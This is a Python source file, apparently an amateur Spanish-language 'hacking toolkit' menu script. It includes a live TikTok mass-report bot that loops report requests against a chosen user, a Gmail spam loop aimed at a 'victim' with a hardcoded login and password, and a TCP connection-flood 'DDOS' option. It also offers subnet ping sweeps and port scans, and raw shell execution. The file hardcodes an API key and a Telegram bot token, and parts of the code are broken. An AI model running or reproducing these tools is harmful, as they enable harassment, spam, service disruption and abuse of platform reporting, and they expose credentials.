import requests
from time import sleep
from os import name, system
import json
import urllib.request as request
import ssl
from urllib import request
from binascii import hexlify
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
from email.mime.text import MIMEText
import socket
import telebot  
import logging
import asyncio
import sys
from time import sleep
from http.server import BaseHTTPRequestHandler
import time
import os
import platform
from datetime import datetime
import binascii
import ipaddress
import platform
os.system('pip install requests')
os.system('pip install telebot')
os.system('clear')
RR = "\033[29;m"
def a(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(1./170)
00

a(RR+"█▀▄▀█ █▀▀▀ █▄░▒█ █░▒█ ░░ █▀▀▀█ █▀▀█ █▀▀█ ▀█▀ █▀▀█ ▀▀█▀▀ █▀▀▀█")
a(RR+"█▒█▒█ █▀▀▀ █▒█▒█ █░▒█ ▀▀ ▀▀▀▄▄ █░░░ █▄▄▀ ░█░ █▄▄█ ░▒█░░ ▀▀▀▄▄")
a(RR+"█░░▒█ █▄▄▄ █░░▀█ ▀▄▄▀ ░░ █▄▄▄█ █▄▄█ █░▒█ ▄█▄ █░░░ ░▒█░░ █▄▄▄█")
a(RR+"╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱   ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱")

a(RR+" Creador: Axel")      
a(RR+" Tiktok: axel.is.pastriboy") 
a(RR+" instagram: a30xp30")
a(RR+" YouTube: a..x..e..l..x..s")
print("")
a(RR+"╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱   ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱")
choice = int(input("1.-TIKTOK REPORT BOT\n2.-ESCANEO WEP\n3.-spam de correos gmail\n4.-info de IP publica\n5.-Servidor privado http\n6.-Mi IP privada \n7.-info basica de cualquier tipo de ip \n8.-Info de un numero\n9.-Barrido de IP\n10.-BotChat\n11.-TelegramBot\n12.-DDOS\n13.-codigo fuente de una wep\n14.-SSL wep\n15.-Usar bash\nSeleccione una opsion: ")) 
b = 1         
if choice == 1:
  cv = int(input("1.-simulador de report\n2.-Real\nSelecciona una opsion: "))
  if cv == 1:
      op = int(input("1.-atake consentrado\n2.-atake bruto\nSeleccione una opsion:"))  
      if op == 1:
       os.system("clear")
       a(RR+"  █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀█ ▀▀█▀▀ ░░ █▀▀█ █▀▀▀█ ▀▀█▀▀")
       a(RR+"  █▄▄▀ █▀▀▀ █▄▄█ █░░▒█ █▄▄▀ ░▒█░░ ▀▀ █▀▀▄ █░░▒█ ░▒█░░")
       a(RR+"  █░▒█ █▄▄▄ █░░░ █▄▄▄█ █░▒█ ░▒█░░ ░░ █▄▄█ █▄▄▄█ ░▒█░░")
       print("\033[;32m")
       username = ""
       username = input("usuario:")
       while True:
             print (("[*]"),"REPORT-BOT FOR TIKTOK USER @", (username), (b))
             sleep(1)
             b = b + 1
      elif op == 2:
       os.system("clear")
       a(RR+"  █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀█ ▀▀█▀▀ ░░ █▀▀█ █▀▀▀█ ▀▀█▀▀")
       a(RR+"  █▄▄▀ █▀▀▀ █▄▄█ █░░▒█ █▄▄▀ ░▒█░░ ▀▀ █▀▀▄ █░░▒█ ░▒█░░")
       a(RR+"  █░▒█ █▄▄▄ █░░░ █▄▄▄█ █░▒█ ░▒█░░ ░░ █▄▄█ █▄▄▄█ ░▒█░░")
       print("\033[;32m")
       username = ""
       username = input("usuario:")
       while True:
             print (("[*]"),"REPORT-BOT FOR TIKTOK USER @", (username), (b))
             b = b + 1  

  elif cv == 2:

        col = "\033[32;m"
        
        try:
          import requests
        except ImportError:
            os.system('python -m pip install requests')
        try:
          import urllib3
        except ImportError:
            os.system('python -m pip install urllib3')
        try:
          from bs4 import BeautifulSoup
        except ImportError:
            os.system('python -m pip install bs4')
        
        def clear():
            if name == 'nt':
                _ = system('cls')
            else:
                _ = system('clear')
        
        clear()
        a(RR+"  █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀█ ▀▀█▀▀ ░░ █▀▀█ █▀▀▀█ ▀▀█▀▀")
        a(RR+"  █▄▄▀ █▀▀▀ █▄▄█ █░░▒█ █▄▄▀ ░▒█░░ ▀▀ █▀▀▄ █░░▒█ ░▒█░░")
        a(RR+"  █░▒█ █▄▄▄ █░░░ █▄▄▄█ █░▒█ ░▒█░░ ░░ █▄▄█ █▄▄▄█ ░▒█░░")
        
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        srttm = time.time()
        
        usr = input("[?] Username: ")
        
        if usr.startswith("@"):
            usr = usr
        else:
            usr = f"@{usr}"
        
        r0 = requests.get(f"https://www.tiktok.com/{usr}", headers={"User-Agent":"Mozilla/5.0 (Linux; Android 11; M2102J20SG Build/RQ3A.210705.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 trill_2022002050 JsSdk/1.0 NetType/WIFI Channel/googleplay AppName/musical_ly app_version/20.2.5 ByteLocale/en ByteFullLocale/en Region/US"})
        soup = BeautifulSoup(r0.text, "html.parser")
        content = soup.find_all(attrs={"id":"__NEXT_DATA__"})
        content = json.loads(content[0].contents[0])
        profile_data = {
            "uid":content['props']['pageProps']['userInfo']['user']['id']
            }
        
        uid = f"{profile_data.get('uid')}"
        
        print("\n", end="")
        
        def report():
            h1 = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US",
                "content-type": "application/json",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
                }
        
            d1 = """{
                "reason": "311",
                "object_id": "%s",
                "owner_id": "%s",
                "report_type": "user"
                }""" % (uid, uid)
        
            r1 = requests.post("https://www.tiktok.com/node/report/reasons_put?", headers=h1, data=d1, verify=False, timeout=999999)
        
            if r1.ok:
                r1json = r1.json()
                #if r1json.get("statusCode") == True:
                      #  try:
                          #  print(f"[+] Report sent successfully")
                    #    except:
                      #       print(f"[-] Report could not be sent")
                         #    return
                        
            try:
                 print(col, v, "[+] Report send successfull") 
            except:
                  print(col, v, "[-] Reporr could not be sent")   
        
        v = 0
        print("User ID: ", uid)
        print("Username: ", usr)    
                
        while True:
            v = v+1
            report()
            time.sleep(2.0 - ((time.time() - srttm) % 2.0))
       
       
     
                
                  
                  
                  
elif choice == 2:
    a = ""
    a = input("ingresa el dominio wep:")
    TARGETS = [
    ((a), 'https')
    ]
    
    
    async def main(loop, targets):
            for target in targets:
                info = await loop.getaddrinfo(
                *target,
                proto=socket.IPPROTO_TCP,
            ) 
             
            for host in info:
                print('{:20}: {}'.format(target[0], host[4][0]))
        
    event_loop = asyncio.get_event_loop()
    try:
            event_loop.run_until_complete(main(event_loop, TARGETS))
    finally:
            event_loop.close()
    try:
            print("escaneo exitoso")
    except:
                print("ERROR")
    def myping(host):
      response = os.system("ping -c 1 " + host)
    
      if response == 0:
        return True
      else:
        return False
        
    print(myping(a))
    def formato_direccion_ip():
    		
    		 equipo_remoto_a = socket.gethostbyname(a)
    
    		 for dir_ip in [equipo_remoto_a]:
    					 empaquetada_ip = socket.inet_aton(dir_ip)
    					 no_empaquetada_ip = socket.inet_ntoa(empaquetada_ip)
    					 print ("Direccion Ip: %s => Empaquetada: %s, No Empaquetada: %s" %(dir_ip, hexlify(empaquetada_ip), no_empaquetada_ip))
    
    if __name__ == '__main__':
    		 formato_direccion_ip()
    		 
    		 quit()
                  
elif choice == 3:
   os.system("clear")
   a (RR+"█▀▀ █▀▀ █▀▀▄ █▀▀▄ █▀▄▀█ █▀▀█ ░▀░ █░░")
   a(RR+"▀▀█ █▀▀ █░░█ █░░█ █░▀░█ █▄▄█ ▀█▀ █░░")
   a(RR+"▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀░ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀")
   
   from email.mime.multipart import MIMEMultipart
   from email.mime.text import MIMEText
   import smtplib
   msg = MIMEMultipart()
   a = ""
   a = input("gmail de la victima:")
   b = input("asunto:")
   c = input ("contenido:")
   d = float(input("numero se mensajes que quieres enviar:"))
   message = (c)
   e = 0
   while e < d:
    password = "gogle2000"
    msg['From'] = "gogle.spport.mx@gmail.com"
    msg['To'] = (a)
    msg['Subject'] = (b)
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    e = e+1
   
   server.quit()
   try:
       print ("correo(s) enviado a %s con exito" % (msg['To']))
       
   except:
    print("[#]ERROR")
    
                      
                      
elif choice == 4:
  
  api_url = "http://ip-api.com/json/"
  parametros = 'status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
  data = {"fields":parametros}
  def ip_scraping(ip=""):
      res = requests.get(api_url+ip, data=data)
      api_json_res = json.loads(res.content)
      return api_json_res
  if __name__ == '__main__':
          ip = input("𝙄𝙉𝙂𝙍𝙀𝙎𝘼 𝙇𝘼 𝙄𝙋: ")
          par = parametros.split(",")
          for x in par:
              print(x.upper(), ":")
              print(ip_scraping(ip)[x])
              print("n")
              
    
              
              
elif choice == 5:
     print("\033[;32m")
     class GetHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header(
            'Content-Type',
            'text/plain; charset=utf-8',
            )
            self.send_header(
            'Last-Modified',
            self.date_time_string(time.time())
            )
    

            self.end_headers()
            self.wfile.write((text).encode('utf-8'))
     IP = ""
     IP = input("ingresa tu direccion IP, si no quieres solo pon 'localhost': ")
     print("para entrar al server busca en gogle 'localhost:8000 o si pusiste tu ip solo cambias el localhost por la IP")
     text = ""
     text = input ("ingresa el contenido del server:")
     if __name__ == '__main__':
         from http.server import HTTPServer
         server = HTTPServer(( (IP), 8000,), GetHandler)
     try:
        print("coneccion exitosa :)")
        sleep(1)
        print("te doy la bienvenida a mi server")
        sleep(1)
        print("la coneccion esta avierta...")
        server.serve_forever()
     except:
        print("ERROR :(")
        
        
elif choice == 6:
        def extract_ip():
            st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                st.connect(('10.255.255.255', 1))
                IP = st.getsockname()[0]
            except Exception:
                IP = '127.0.0.1'
            finally:
                st.close()
            return IP
        print(extract_ip())



elif choice == 7:
     IP = ""
     IP = input("PONGA LA IP:")
     ADDRESSES = [IP]
     for ip in ADDRESSES:
         addr = ipaddress.ip_address(ip)
         print('{!r}'.format(addr))
         print('   IP version:', addr.version)
         print('   is private:', addr.is_private)
         print('  packed form:', binascii.hexlify(addr.packed))
         print('      integer:', int(addr))
         print()
     
     
elif choice == 8:

    os.system("clear")
   
    api_key = '31e04799e5b72d22be4bed51565ddadb'
    number = int(input("Numero de telefono: "))
    data = requests.get("http://apilayer.net/api/validate?access_key=%s&number=%s&country_code&format=1" % (api_key, number))
    for key, value in data.json().items():
        print("%s: %s" % (key, value))
   
 
elif choice == 9:
    
    
    g = int(input("1.-barrido grande\n2.-barrido a solo puertos basicos (21, 22, 25, 80)\nEnter Choice : ")) 
    
    
    if g == 1:
        
        print("\033[32;1m")
        
        ip = input("Ingresa la IP: ")
        ipDividida = ip.split('.')
        try:
            red = ipDividida[0]+'.'+ipDividida[1]+'.'+ipDividida[2]+'.'
            comienzo = int(input("Ingresa el número de comienzo de la subred: "))
            fin = int(input("Ingresa el número en el que deseas acabar el barrido: "))
            print ("[#] el barrido puede tardar segun la ip")
        except:
            print("[!] Error")
            sys.exit(1)
            
            
        if (platform.system()=="Windows"):
            ping = "ping -n 1"
        else :
            ping = "ping -c 1"
            tiempoInicio = datetime.now()
            print("[*] El escaneo se está realizando desde",red+str(comienzo),"hasta",red+str(fin))
            for subred in range(comienzo, fin+1):
                direccion = red+str(subred)
                response = os.popen(ping+" "+direccion)
                for line in response.readlines():
                    if ("ttl" in line.lower()):
                        print(direccion,"está activo")
                        break
        tiempoFinal = datetime.now()
        tiempo = tiempoFinal - tiempoInicio
        print("[*] El escaneo ha durado %s"%tiempo)()
        
  
        quit()
      
    
    elif g == 2:
        
            print (" puede que este programa no funcione, si no funciona elija el barrido grande")
            IP = ""
            IP = input ("IP del escaneo :")
            def scan(addr, port):
                socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = socket_obj.connect_ex((addr,port)) 
                socket_obj.close()
                return result
            ports=[21, 22, 25, 80]
            for i in range(1,255):
                addr=(IP).format(i)
                for port in ports:
                    result=scan(addr, port)
                    if result==0:
                        print(addr, port, "OK")
                    else:
                        print(addr, port, "Failed")    
                       
                         
elif choice == 10:
       ahutor = "axelxs"
       print("autor:", ahutor)
       print("BotChat")
       print ("escribe cualquier cosa")
       c = "\033[32;m"
       b = 1
       while True:
           a = input("")
           print (("——"), (c), (b), (a))
           b = b+1    
                        
                       
elif choice == 11:
   
   print ("ES POSIBLE QUE EL BOT NO FINCIONE YA QUE SOLO SE PUEDE EJECUTAR EN python3.9.7")
   
   print("BOT DE TELEGRAM:http://t.me/Pastryboybot")
   print ("Ese es el link de el bot")
   TOKEN = "5203289182:AAEa7KpNV4Fsn2NgUkJWXrpLD1YOlEYk_kc" 
   bot = telebot.TeleBot(TOKEN)  
   @bot.message_handler(commands=['start', 'help'])
   def send_welcome(message):
      bot.reply_to(message, "")
   @bot.message_handler(func=lambda message: True)
   def echo_all(message):
       bot.reply_to(message, message.text)
   bot.polling()
   user = bot.get_me()
   print(user)
   updates = bot.get_updates()
   print(updates)
   chat_id = "5170764644"
   
elif choice == 12:
    os.system("clear")
    RR = "\033[29;m"
    def a(s):
            for c in s + '\n':
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    time.sleep(1./170)
                    
       
    a(RR+"█▀▀▄ █▀▀▄ █▀▀█ █▀▀▀█")
    a(RR+"█░▒█ █░▒█ █░░█ ▀▀▀▄▄")
    a(RR+"█▄▄▀ █▄▄▀ ▀▀▀▀ █▄▄▄█ ")        
    time.sleep(2) 
    
    print("\033[32;m")
    ip = input("hostname o IP>>>")
    port = input("Port>>>>")
    while True:
        
    
        
        size = ("30000")
        ip = str(ip)
        port = int(port)
        pac = int("65536")
        print("\033[32;m")
        print('[*] Launching Attack ...')
        
        addr = ((ip,port))
        socks = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            socks.connect_ex(addr)
            connected = 1
        except socket.error:
            connected = 0
            print('Hostname could not be resolved')
        i = 0
        
        #data = hashlib.sha512(size).hexdigest()
        errors = 0
        a = 0
        while i < pac:
            i+=1
            try:
                socks.settimeout(0.03)
                socks.connect_ex(addr)
                #socks.send(data)
                print("|",(a), "| [*] successfully | ", (port))
                a = a+1
            except socket.error:
                print('[#]Conection Error')
                errors = errors + 1  
    
   
elif choice == 13:
   
    
    url = input("url de la pagina wep: ")
    response = request.urlopen(url)
    print('RESPONSE:', response)
    print('URL     :', response.geturl())
    
    headers = response.info()
    print('DATE    :', headers['date'])
    print('HEADERS :')
    print('---------')
    print(headers)
    
    data = response.read().decode('utf-8')
    print('LENGTH  :', len(data))
    print('DATA    :')
    print('---------')
    print(data)  
    
                      
                                         
elif choice == 14:
 
    print("este script manda mensajes encriotados a paginas wep")
    t = input("Texto: ")
    xd = input("pagina wep: ")
        
    if (not os.environ.get((t), '') and
    getattr(ssl, '_create_unverified_context', None)): 
    
       ssl._create_default_https_context = ssl._create_unverified_context
       class InternetOk():
            def Internet(self):
                siInternet = False
                while not siInternet:    
                    try :
                        web = (xd)
                        data = request.urlopen(web)
                        siInternet = True
                        break
                    except:
                        siInternet = False
                return  siInternet
    inter = InternetOk()
    print (inter.Internet())                                                           
    
elif choice == 15:
    print("Bash > python3.9 > Linux > 2022")
    while True:
        a = input(">>>")
        os.system(a)    
